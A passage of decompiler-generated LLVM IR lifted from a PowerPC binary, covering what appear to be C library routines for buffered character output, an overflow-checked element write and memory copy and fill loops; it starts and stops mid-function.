  uselistorder i32 %v0_10006e30, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10006eb4, { 1, 0 }
  uselistorder label %dec_label_pc_10006eb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006e9c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10006e30, { 1, 0 }
}

define i32 @function_10006ecc(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10006ecc:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp7 = sext i8 %arg1 to i32
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp7, i32* @r30, align 4
  %v2_10006ee4 = add i32 %arg2, 16
  %v3_10006ee4 = inttoptr i32 %v2_10006ee4 to i32*
  %v4_10006ee4 = load i32, i32* %v3_10006ee4, align 4
  store i32 %v4_10006ee4, i32* %r11.global-to-local, align 4
  %v2_10006ee8 = add i32 %arg2, 28
  %v3_10006ee8 = inttoptr i32 %v2_10006ee8 to i32*
  %v4_10006ee8 = load i32, i32* %v3_10006ee8, align 4
  %v2_10006eec = icmp ult i32 %v4_10006ee4, %v4_10006ee8
  br i1 %v2_10006eec, label %dec_label_pc_10006ef4, label %dec_label_pc_10006f08

dec_label_pc_10006ef4:                            ; preds = %dec_label_pc_10006ecc
  %v1_10006ef41 = zext i8 %arg1 to i32
  %v1_10006ef8 = add i32 %v4_10006ee4, 1
  store i32 %v1_10006ef8, i32* %r9.global-to-local, align 4
  store i32 %v1_10006ef41, i32* %r3.global-to-local, align 4
  %v3_10006f00 = inttoptr i32 %v4_10006ee4 to i8*
  store i8 %arg1, i8* %v3_10006f00, align 1
  %v0_10006fac.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10006fac.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10006fac

dec_label_pc_10006f08:                            ; preds = %dec_label_pc_10006ecc
  %v3_10006f08 = load i16, i16* %tmp, align 2
  %v4_10006f08 = zext i16 %v3_10006f08 to i32
  %v1_10006f0c = call i32 @__asm_rlwinm(i32 %v4_10006f08, i32 0, i32 24, i32 25)
  %v3_10006f10 = icmp eq i32 %v1_10006f0c, 192
  br i1 %v3_10006f10, label %dec_label_pc_10006f2c, label %dec_label_pc_10006f18

dec_label_pc_10006f18:                            ; preds = %dec_label_pc_10006f08
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 268463908, i32* @lr, align 4
  %v4_10006f20 = call i32 @function_10009ebc(i16* nonnull %tmp, i32 128)
  store i32 %v4_10006f20, i32* %r3.global-to-local, align 4
  %v3_10006f24 = icmp eq i32 %v4_10006f20, 0
  br i1 %v3_10006f24, label %dec_label_pc_10006f2c, label %dec_label_pc_10006fd8

dec_label_pc_10006f2c:                            ; preds = %dec_label_pc_10006f18, %dec_label_pc_10006f08
  %v0_10006f2c = load i32, i32* @r31, align 4
  %v1_10006f2c = add i32 %v0_10006f2c, 4
  %v2_10006f2c = inttoptr i32 %v1_10006f2c to i32*
  %v3_10006f2c = load i32, i32* %v2_10006f2c, align 4
  %v0_10006f30 = load i32, i32* @r30, align 4
  %v1_10006f30 = urem i32 %v0_10006f30, 256
  store i32 %v1_10006f30, i32* %r3.global-to-local, align 4
  %v3_10006f34 = icmp eq i32 %v3_10006f2c, -2
  br i1 %v3_10006f34, label %dec_label_pc_10006fdc, label %dec_label_pc_10006f3c

dec_label_pc_10006f3c:                            ; preds = %dec_label_pc_10006f2c
  %v1_10006f3c = add i32 %v0_10006f2c, 12
  %v2_10006f3c = inttoptr i32 %v1_10006f3c to i32*
  %v3_10006f3c = load i32, i32* %v2_10006f3c, align 4
  store i32 %v3_10006f3c, i32* %r9.global-to-local, align 4
  %v1_10006f40 = add i32 %v0_10006f2c, 8
  %v2_10006f40 = inttoptr i32 %v1_10006f40 to i32*
  %v3_10006f40 = load i32, i32* %v2_10006f40, align 4
  %v4_10006f44 = icmp eq i32 %v3_10006f3c, %v3_10006f40
  br i1 %v4_10006f44, label %dec_label_pc_10006fb4, label %dec_label_pc_10006f4c

dec_label_pc_10006f4c:                            ; preds = %dec_label_pc_10006f3c
  %v1_10006f4c = add i32 %v0_10006f2c, 16
  %v2_10006f4c = inttoptr i32 %v1_10006f4c to i32*
  %v3_10006f4c = load i32, i32* %v2_10006f4c, align 4
  %v4_10006f50 = icmp eq i32 %v3_10006f3c, %v3_10006f4c
  br i1 %v4_10006f50, label %dec_label_pc_10006f58, label %dec_label_pc_10006f68

dec_label_pc_10006f58:                            ; preds = %dec_label_pc_10006f4c
  store i32 %v0_10006f2c, i32* @r3, align 4
  store i32 268463968, i32* @lr, align 4
  %v0_10006f5c = call i32 @function_10005838()
  store i32 %v0_10006f5c, i32* %r3.global-to-local, align 4
  %v3_10006f60 = icmp eq i32 %v0_10006f5c, 0
  br i1 %v3_10006f60, label %dec_label_pc_10006f58.dec_label_pc_10006f68_crit_edge, label %dec_label_pc_10006fd8

dec_label_pc_10006f58.dec_label_pc_10006f68_crit_edge: ; preds = %dec_label_pc_10006f58
  %v0_10006f68.pre = load i32, i32* @r31, align 4
  %v0_10006f6c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006f68

dec_label_pc_10006f68:                            ; preds = %dec_label_pc_10006f58.dec_label_pc_10006f68_crit_edge, %dec_label_pc_10006f4c
  %v0_10006f6c = phi i32 [ %v0_10006f6c.pre, %dec_label_pc_10006f58.dec_label_pc_10006f68_crit_edge ], [ %v0_10006f30, %dec_label_pc_10006f4c ]
  %v0_10006f68 = phi i32 [ %v0_10006f68.pre, %dec_label_pc_10006f58.dec_label_pc_10006f68_crit_edge ], [ %v0_10006f2c, %dec_label_pc_10006f4c ]
  %v1_10006f68 = add i32 %v0_10006f68, 16
  %v2_10006f68 = inttoptr i32 %v1_10006f68 to i32*
  %v3_10006f68 = load i32, i32* %v2_10006f68, align 4
  store i32 %v3_10006f68, i32* %r9.global-to-local, align 4
  %v1_10006f6c = urem i32 %v0_10006f6c, 256
  store i32 %v1_10006f6c, i32* %r11.global-to-local, align 4
  %v1_10006f70 = trunc i32 %v0_10006f6c to i8
  %v3_10006f70 = inttoptr i32 %v3_10006f68 to i8*
  store i8 %v1_10006f70, i8* %v3_10006f70, align 1
  %v0_10006f74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006f74 = add i32 %v0_10006f74, 1
  store i32 %v1_10006f74, i32* %r9.global-to-local, align 4
  %v1_10006f78 = load i32, i32* @r31, align 4
  %v2_10006f78 = add i32 %v1_10006f78, 16
  %v3_10006f78 = inttoptr i32 %v2_10006f78 to i32*
  store i32 %v1_10006f74, i32* %v3_10006f78, align 4
  %v0_10006f7c = load i32, i32* @r31, align 4
  %v1_10006f7c = inttoptr i32 %v0_10006f7c to i16*
  %v2_10006f7c = load i16, i16* %v1_10006f7c, align 2
  %v3_10006f7c = zext i16 %v2_10006f7c to i32
  %v1_10006f80 = and i32 %v3_10006f7c, 256
  store i32 %v1_10006f80, i32* %r9.global-to-local, align 4
  %v3_10006f80 = icmp eq i32 %v1_10006f80, 0
  br i1 %v3_10006f80, label %dec_label_pc_10006fd0, label %dec_label_pc_10006f88

dec_label_pc_10006f88:                            ; preds = %dec_label_pc_10006f68
  %v0_10006f88 = load i32, i32* %r11.global-to-local, align 4
  %v3_10006f88 = icmp eq i32 %v0_10006f88, 10
  br i1 %v3_10006f88, label %dec_label_pc_10006f90, label %dec_label_pc_10006fd0

dec_label_pc_10006f90:                            ; preds = %dec_label_pc_10006f88
  store i32 %v0_10006f7c, i32* @r3, align 4
  store i32 268464024, i32* @lr, align 4
  %v0_10006f94 = call i32 @function_10005838()
  store i32 %v0_10006f94, i32* %r3.global-to-local, align 4
  %v3_10006f98 = icmp eq i32 %v0_10006f94, 0
  br i1 %v3_10006f98, label %dec_label_pc_10006fd0, label %dec_label_pc_10006fa0

dec_label_pc_10006fa0:                            ; preds = %dec_label_pc_10006f90
  %v0_10006fa0 = load i32, i32* @r31, align 4
  %v1_10006fa0 = add i32 %v0_10006fa0, 16
  %v2_10006fa0 = inttoptr i32 %v1_10006fa0 to i32*
  %v3_10006fa0 = load i32, i32* %v2_10006fa0, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10006fa8 = add i32 %v3_10006fa0, -1
  store i32 %v1_10006fa8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10006fac

dec_label_pc_10006fac:                            ; preds = %dec_label_pc_10006ef4, %dec_label_pc_10006fa0
  %v1_10006fac = phi i32 [ %v1_10006fac.pre, %dec_label_pc_10006ef4 ], [ %v0_10006fa0, %dec_label_pc_10006fa0 ]
  %v0_10006fac = phi i32 [ %v0_10006fac.pre, %dec_label_pc_10006ef4 ], [ %v1_10006fa8, %dec_label_pc_10006fa0 ]
  %v2_10006fac = add i32 %v1_10006fac, 16
  %v3_10006fac = inttoptr i32 %v2_10006fac to i32*
  store i32 %v0_10006fac, i32* %v3_10006fac, align 4
  %v0_10006fec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006fdc

dec_label_pc_10006fb4:                            ; preds = %dec_label_pc_10006f3c
  %v1_10006fb4 = inttoptr i32 %v0_10006f2c to i16*
  store i32 %v0_10006f2c, i32* %r3.global-to-local, align 4
  %v2_10006fb8 = ptrtoint i8* %stack_var_-24 to i32
  store i32 1, i32* @r5, align 4
  %v6_10006fc0 = trunc i32 %v0_10006f30 to i8
  store i8 %v6_10006fc0, i8* %stack_var_-24, align 1
  store i32 268464072, i32* @lr, align 4
  %v5_10006fc4 = call i32 @function_10009c70(i16* %v1_10006fb4, i32 %v2_10006fb8)
  store i32 %v5_10006fc4, i32* %r3.global-to-local, align 4
  %v3_10006fc8 = icmp eq i32 %v5_10006fc4, 0
  br i1 %v3_10006fc8, label %dec_label_pc_10006fd8, label %dec_label_pc_10006fd0

dec_label_pc_10006fd0:                            ; preds = %dec_label_pc_10006f88, %dec_label_pc_10006fb4, %dec_label_pc_10006f90, %dec_label_pc_10006f68
  %v0_10006fd0 = load i32, i32* @r30, align 4
  %v1_10006fd0 = urem i32 %v0_10006fd0, 256
  store i32 %v1_10006fd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006fdc

dec_label_pc_10006fd8:                            ; preds = %dec_label_pc_10006f58, %dec_label_pc_10006f18, %dec_label_pc_10006fb4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006fdc

dec_label_pc_10006fdc:                            ; preds = %dec_label_pc_10006f2c, %dec_label_pc_10006fd0, %dec_label_pc_10006fac, %dec_label_pc_10006fd8
  %v0_10006fec = phi i32 [ %v1_10006f30, %dec_label_pc_10006f2c ], [ %v1_10006fd0, %dec_label_pc_10006fd0 ], [ %v0_10006fec.pre, %dec_label_pc_10006fac ], [ -1, %dec_label_pc_10006fd8 ]
  ret i32 %v0_10006fec

; uselistorder directives
  uselistorder i32 %v1_10006fd0, { 1, 0 }
  uselistorder i32 %v0_10006f6c, { 1, 0 }
  uselistorder i32 %v1_10006f30, { 1, 0 }
  uselistorder i32 %v0_10006f30, { 1, 2, 0 }
  uselistorder i32 %v0_10006f2c, { 2, 3, 0, 1, 4, 6, 5, 7 }
  uselistorder i32 %v4_10006ee4, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006fdc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10006fd8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006fd0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10006fac, { 1, 0 }
}

define i32 @function_10006ff0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10006ff0:
  store i32 %arg1, i32* @r3, align 4
  %v0_10007008 = call i32 @function_10007284()
  store i32 %v0_10007008, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10007024.254 to i32), i32* @lr, align 4
  %v4_10007020 = inttoptr i32 %arg2 to i16*
  %v5_10007020 = call i32 @function_1000704c(i32 %arg1, i32 1, i32 %v0_10007008, i16* %v4_10007020)
  %v1_10007028 = load i32, i32* @r27, align 4
  %v4_10007028 = icmp eq i32 %v5_10007020, %v1_10007028
  br i1 %v4_10007028, label %dec_label_pc_10007030, label %dec_label_pc_10007034

dec_label_pc_10007030:                            ; preds = %dec_label_pc_10006ff0
  br label %dec_label_pc_10007034

dec_label_pc_10007034:                            ; preds = %dec_label_pc_10006ff0, %dec_label_pc_10007030
  %v0_10007034 = phi i32 [ -1, %dec_label_pc_10006ff0 ], [ %v5_10007020, %dec_label_pc_10007030 ]
  ret i32 %v0_10007034

; uselistorder directives
  uselistorder label %dec_label_pc_10007034, { 1, 0 }
}

define i32 @function_1000704c(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
dec_label_pc_1000704c:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v3_10007058 = load i16, i16* %arg4, align 2
  %v4_10007058 = zext i16 %v3_10007058 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000706c = call i32 @__asm_rlwinm(i32 %v4_10007058, i32 0, i32 24, i32 25)
  store i32 128, i32* %r4.global-to-local, align 4
  %v3_10007074 = icmp eq i32 %v1_1000706c, 192
  store i32 %arg3, i32* @r31, align 4
  br i1 %v3_10007074, label %dec_label_pc_10007090, label %dec_label_pc_10007084

dec_label_pc_10007084:                            ; preds = %dec_label_pc_1000704c
  store i32 268464264, i32* @lr, align 4
  %v4_10007084 = call i32 @function_10009ebc(i16* nonnull %arg4, i32 128)
  %v3_10007088 = icmp eq i32 %v4_10007084, 0
  br i1 %v3_10007088, label %dec_label_pc_10007084.dec_label_pc_10007090_crit_edge, label %dec_label_pc_100070e8

dec_label_pc_10007084.dec_label_pc_10007090_crit_edge: ; preds = %dec_label_pc_10007084
  %v0_10007094.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007090

dec_label_pc_10007090:                            ; preds = %dec_label_pc_10007084.dec_label_pc_10007090_crit_edge, %dec_label_pc_1000704c
  %v0_100070b4 = phi i32 [ %v0_10007094.pre, %dec_label_pc_10007084.dec_label_pc_10007090_crit_edge ], [ %arg3, %dec_label_pc_1000704c ]
  %v0_10007090 = load i32, i32* @r29, align 4
  %v3_10007090 = icmp eq i32 %v0_10007090, 0
  %v3_10007094 = icmp eq i32 %v0_100070b4, 0
  %brmerge = or i1 %v3_10007094, %v3_10007090
  br i1 %brmerge, label %dec_label_pc_100070e8, label %dec_label_pc_100070a0

dec_label_pc_100070a0:                            ; preds = %dec_label_pc_10007090
  %v2_100070a4 = mul i32 %v0_10007090, %v0_100070b4
  store i32 %v2_100070a4, i32* %r4.global-to-local, align 4
  %v2_100070a8 = udiv i32 -1, %v0_10007090
  %v0_100070b0 = load i32, i32* @r30, align 4
  %v3_100070b4 = icmp ugt i32 %v0_100070b4, %v2_100070a8
  %v1_100070c8 = inttoptr i32 %v0_100070b0 to i16*
  br i1 %v3_100070b4, label %dec_label_pc_100070c8, label %dec_label_pc_100070bc

dec_label_pc_100070bc:                            ; preds = %dec_label_pc_100070a0
  %v0_100070ac = load i32, i32* @r28, align 4
  store i32 268464320, i32* @lr, align 4
  %v5_100070bc = call i32 @function_10009d50(i32 %v0_100070ac, i32 %v2_100070a4, i16* %v1_100070c8)
  %v1_100070c0 = load i32, i32* @r29, align 4
  %v2_100070c0 = udiv i32 %v5_100070bc, %v1_100070c0
  store i32 %v2_100070c0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100070ec

dec_label_pc_100070c8:                            ; preds = %dec_label_pc_100070a0
  %v2_100070c8 = load i16, i16* %v1_100070c8, align 2
  %v1_100070cc = or i16 %v2_100070c8, 8
  store i16 %v1_100070cc, i16* %v1_100070c8, align 2
  %v0_100070d4 = call i32 @function_10004e38()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_100070e0 = inttoptr i32 %v0_100070d4 to i32*
  store i32 22, i32* %v2_100070e0, align 4
  %v0_100070f0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100070ec

dec_label_pc_100070e8:                            ; preds = %dec_label_pc_10007090, %dec_label_pc_10007084
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100070ec

dec_label_pc_100070ec:                            ; preds = %dec_label_pc_100070c8, %dec_label_pc_100070bc, %dec_label_pc_100070e8
  %v0_100070f0 = phi i32 [ %v0_100070f0.pre, %dec_label_pc_100070c8 ], [ %v2_100070c0, %dec_label_pc_100070bc ], [ 0, %dec_label_pc_100070e8 ]
  ret i32 %v0_100070f0

; uselistorder directives
  uselistorder i16* %v1_100070c8, { 1, 2, 0 }
  uselistorder i32 %v0_10007090, { 1, 0, 2 }
  uselistorder i32 %v0_100070b4, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i16*)* @function_10009d50, { 6, 1, 2, 4, 5, 0, 3 }
  uselistorder i32 (i16*, i32)* @function_10009ebc, { 1, 0 }
  uselistorder label %dec_label_pc_100070ec, { 2, 0, 1 }
}

define i32 @function_10007104() local_unnamed_addr {
dec_label_pc_10007104:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10007104 = load i32, i32* @r4, align 4
  %v1_10007104 = add i32 %v0_10007104, -4
  store i32 %v1_10007104, i32* %r4.global-to-local, align 4
  %v0_10007108 = load i32, i32* @r3, align 4
  %v1_10007108 = add i32 %v0_10007108, -4
  store i32 %v1_10007108, i32* @r11, align 4
  %v0_1000710c = load i32, i32* @r5, align 4
  %v1_1000710c = call i32 @__asm_rlwinm.(i32 %v0_1000710c, i32 29, i32 3, i32 31)
  store i32 %v1_1000710c, i32* %r9.global-to-local, align 4
  %v4_1000710c = icmp eq i32 %v1_1000710c, 0
  br i1 %v4_1000710c, label %dec_label_pc_10007134, label %dec_label_pc_10007114

dec_label_pc_10007114:                            ; preds = %dec_label_pc_10007104
  %v0_10007114 = load i32, i32* @r11, align 4
  %v1_10007114 = urem i32 %v0_10007114, 4
  %v3_10007114 = icmp eq i32 %v1_10007114, 0
  br i1 %v3_10007114, label %dec_label_pc_1000711c, label %dec_label_pc_10007170

dec_label_pc_1000711c:                            ; preds = %dec_label_pc_10007190.dec_label_pc_1000711c_crit_edge, %dec_label_pc_10007114
  %v1_10007128.pre = phi i32 [ %v0_10007114, %dec_label_pc_10007114 ], [ %v1_10007128.pre.pre, %dec_label_pc_10007190.dec_label_pc_1000711c_crit_edge ]
  %v0_1000711c = phi i32 [ %v1_1000710c, %dec_label_pc_10007114 ], [ %v1_10007190, %dec_label_pc_10007190.dec_label_pc_1000711c_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10007114 ], [ %v2_10007178, %dec_label_pc_10007190.dec_label_pc_1000711c_crit_edge ]
  store i32 %v0_1000711c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007120

dec_label_pc_10007120:                            ; preds = %dec_label_pc_10007120, %dec_label_pc_1000711c
  %v1_10007128 = phi i32 [ %v2_1000712c, %dec_label_pc_10007120 ], [ %v1_10007128.pre, %dec_label_pc_1000711c ]
  %v0_10007120 = load i32, i32* %r4.global-to-local, align 4
  %v1_10007120 = add i32 %v0_10007120, 4
  %v2_10007120 = inttoptr i32 %v1_10007120 to i32*
  %v3_10007120 = load i32, i32* %v2_10007120, align 4
  %v1_10007124 = add i32 %v0_10007120, 8
  %v2_10007124 = inttoptr i32 %v1_10007124 to i32*
  %v3_10007124 = load i32, i32* %v2_10007124, align 4
  store i32 %v3_10007124, i32* %r9.global-to-local, align 4
  store i32 %v1_10007124, i32* %r4.global-to-local, align 4
  %v2_10007128 = add i32 %v1_10007128, 4
  %v3_10007128 = inttoptr i32 %v2_10007128 to i32*
  store i32 %v3_10007120, i32* %v3_10007128, align 4
  %v0_1000712c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000712c = load i32, i32* @r11, align 4
  %v2_1000712c = add i32 %v1_1000712c, 8
  %v3_1000712c = inttoptr i32 %v2_1000712c to i32*
  store i32 %v0_1000712c, i32* %v3_1000712c, align 4
  store i32 %v2_1000712c, i32* @r11, align 4
  %v0_10007130 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007130 = add i32 %v0_10007130, -1
  store i32 %v1_10007130, i32* %ctr.global-to-local, align 4
  %v2_10007130 = icmp eq i32 %v1_10007130, 0
  br i1 %v2_10007130, label %dec_label_pc_10007134, label %dec_label_pc_10007120

dec_label_pc_10007134:                            ; preds = %dec_label_pc_10007120, %dec_label_pc_10007190, %dec_label_pc_10007104
  %.1 = phi i32 [ undef, %dec_label_pc_10007104 ], [ %v2_10007178, %dec_label_pc_10007190 ], [ %.0, %dec_label_pc_10007120 ]
  %v1_10007134 = urem i32 %.1, 8
  store i32 %v1_10007134, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10007134, 4
  br i1 %tmp, label %dec_label_pc_1000714c, label %dec_label_pc_10007140

dec_label_pc_10007140:                            ; preds = %dec_label_pc_10007134
  %v0_10007140 = load i32, i32* %r4.global-to-local, align 4
  %v1_10007140 = add i32 %v0_10007140, 4
  %v2_10007140 = inttoptr i32 %v1_10007140 to i32*
  %v3_10007140 = load i32, i32* %v2_10007140, align 4
  store i32 %v1_10007140, i32* %r4.global-to-local, align 4
  %v1_10007144 = add nsw i32 %v1_10007134, -4
  store i32 %v1_10007144, i32* @r5, align 4
  %v1_10007148 = load i32, i32* @r11, align 4
  %v2_10007148 = add i32 %v1_10007148, 4
  %v3_10007148 = inttoptr i32 %v2_10007148 to i32*
  store i32 %v3_10007140, i32* %v3_10007148, align 4
  store i32 %v2_10007148, i32* @r11, align 4
  %v0_1000714c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000714c

dec_label_pc_1000714c:                            ; preds = %dec_label_pc_10007134, %dec_label_pc_10007140
  %v0_1000714c = phi i32 [ %v1_10007134, %dec_label_pc_10007134 ], [ %v0_1000714c.pre, %dec_label_pc_10007140 ]
  %v3_1000714c = icmp eq i32 %v0_1000714c, 0
  %v0_10007150 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000714c, i32 %v0_10007150)
  %v0_10007154 = load i32, i32* @r5, align 4
  store i32 %v0_10007154, i32* %ctr.global-to-local, align 4
  %v0_10007158 = load i32, i32* %r4.global-to-local, align 4
  %v1_10007158 = add i32 %v0_10007158, 3
  store i32 %v1_10007158, i32* %r4.global-to-local, align 4
  %v0_1000715c = load i32, i32* @r11, align 4
  %v1_1000715c = add i32 %v0_1000715c, 3
  store i32 %v1_1000715c, i32* %r9.global-to-local, align 4
  %v1_100071608 = add i32 %v0_10007158, 4
  %v2_100071609 = inttoptr i32 %v1_100071608 to i8*
  %v3_1000716010 = load i8, i8* %v2_100071609, align 1
  store i32 %v1_100071608, i32* %r4.global-to-local, align 4
  %v3_1000716412 = add i32 %v0_1000715c, 4
  %v4_1000716413 = inttoptr i32 %v3_1000716412 to i8*
  store i8 %v3_1000716010, i8* %v4_1000716413, align 1
  store i32 %v3_1000716412, i32* %r9.global-to-local, align 4
  %v0_1000716814 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000716815 = add i32 %v0_1000716814, -1
  store i32 %v1_1000716815, i32* %ctr.global-to-local, align 4
  %v2_1000716816 = icmp eq i32 %v1_1000716815, 0
  br i1 %v2_1000716816, label %dec_label_pc_1000719c, label %dec_label_pc_10007160.dec_label_pc_10007160_crit_edge

dec_label_pc_10007160.dec_label_pc_10007160_crit_edge: ; preds = %dec_label_pc_1000714c, %dec_label_pc_10007160.dec_label_pc_10007160_crit_edge
  %v3_1000716417 = phi i32 [ %v3_10007164, %dec_label_pc_10007160.dec_label_pc_10007160_crit_edge ], [ %v3_1000716412, %dec_label_pc_1000714c ]
  %v0_10007160.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10007160 = add i32 %v0_10007160.pre, 1
  %v2_10007160 = inttoptr i32 %v1_10007160 to i8*
  %v3_10007160 = load i8, i8* %v2_10007160, align 1
  store i32 %v1_10007160, i32* %r4.global-to-local, align 4
  %v3_10007164 = add i32 %v3_1000716417, 1
  %v4_10007164 = inttoptr i32 %v3_10007164 to i8*
  store i8 %v3_10007160, i8* %v4_10007164, align 1
  store i32 %v3_10007164, i32* %r9.global-to-local, align 4
  %v0_10007168 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007168 = add i32 %v0_10007168, -1
  store i32 %v1_10007168, i32* %ctr.global-to-local, align 4
  %v2_10007168 = icmp eq i32 %v1_10007168, 0
  br i1 %v2_10007168, label %dec_label_pc_1000719c, label %dec_label_pc_10007160.dec_label_pc_10007160_crit_edge

dec_label_pc_10007170:                            ; preds = %dec_label_pc_10007114
  %v1_10007170 = sub nsw i32 4, %v1_10007114
  store i32 %v1_10007170, i32* %ctr.global-to-local, align 4
  %v1_10007178 = load i32, i32* @r5, align 4
  %v2_10007178 = sub i32 %v1_10007178, %v1_10007170
  br label %dec_label_pc_1000717c

dec_label_pc_1000717c:                            ; preds = %dec_label_pc_1000717c, %dec_label_pc_10007170
  %v2_10007184 = phi i32 [ %v1_10007188, %dec_label_pc_1000717c ], [ %v0_10007114, %dec_label_pc_10007170 ]
  %v0_1000717c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000717c = add i32 %v0_1000717c, 4
  %v2_1000717c = inttoptr i32 %v1_1000717c to i8*
  %v3_1000717c = load i8, i8* %v2_1000717c, align 1
  %v1_10007180 = add i32 %v0_1000717c, 1
  store i32 %v1_10007180, i32* %r4.global-to-local, align 4
  %v3_10007184 = add i32 %v2_10007184, 4
  %v4_10007184 = inttoptr i32 %v3_10007184 to i8*
  store i8 %v3_1000717c, i8* %v4_10007184, align 1
  %v0_10007188 = load i32, i32* @r11, align 4
  %v1_10007188 = add i32 %v0_10007188, 1
  store i32 %v1_10007188, i32* @r11, align 4
  %v0_1000718c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000718c = add i32 %v0_1000718c, -1
  store i32 %v1_1000718c, i32* %ctr.global-to-local, align 4
  %v2_1000718c = icmp eq i32 %v1_1000718c, 0
  br i1 %v2_1000718c, label %dec_label_pc_10007190, label %dec_label_pc_1000717c

dec_label_pc_10007190:                            ; preds = %dec_label_pc_1000717c
  %v1_10007190 = call i32 @__asm_rlwinm.(i32 %v2_10007178, i32 29, i32 3, i32 31)
  store i32 %v1_10007190, i32* %r9.global-to-local, align 4
  %v4_10007190 = icmp eq i32 %v1_10007190, 0
  br i1 %v4_10007190, label %dec_label_pc_10007134, label %dec_label_pc_10007190.dec_label_pc_1000711c_crit_edge

dec_label_pc_10007190.dec_label_pc_1000711c_crit_edge: ; preds = %dec_label_pc_10007190
  %v1_10007128.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000711c

dec_label_pc_1000719c:                            ; preds = %dec_label_pc_10007160.dec_label_pc_10007160_crit_edge, %dec_label_pc_1000714c
  %v0_1000719c = load i32, i32* @r3, align 4
  ret i32 %v0_1000719c

; uselistorder directives
  uselistorder i32 %v1_10007190, { 1, 2, 0 }
  uselistorder i32 %v1_1000718c, { 1, 0 }
  uselistorder i32 %v1_10007188, { 1, 0 }
  uselistorder i32 %v2_10007178, { 2, 1, 0 }
  uselistorder i32 %v1_10007168, { 1, 0 }
  uselistorder i32 %v3_10007164, { 1, 2, 0 }
  uselistorder i32 %v1_10007134, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10007130, { 1, 0 }
  uselistorder i32 %v2_1000712c, { 1, 2, 0 }
  uselistorder i32 %v1_10007114, { 1, 0 }
  uselistorder i32 %v0_10007114, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 7, 3, 2, 0, 4, 8, 5, 10, 6, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10007160.dec_label_pc_10007160_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000714c, { 1, 0 }
  uselistorder label %dec_label_pc_10007134, { 1, 0, 2 }
}

define i32 @function_100071a0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100071a0:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_100071a4 = add i32 %arg1, -4
  store i32 %v1_100071a4, i32* %r11.global-to-local, align 4
  %v1_100071a8 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_100071ac = call i32 @__asm_rlwimi(i32 %v1_100071a8, i32 16, i32 0, i32 15)
  %v2_100071ac = trunc i32 %v1_100071ac to i8
  %v1_100071b0 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
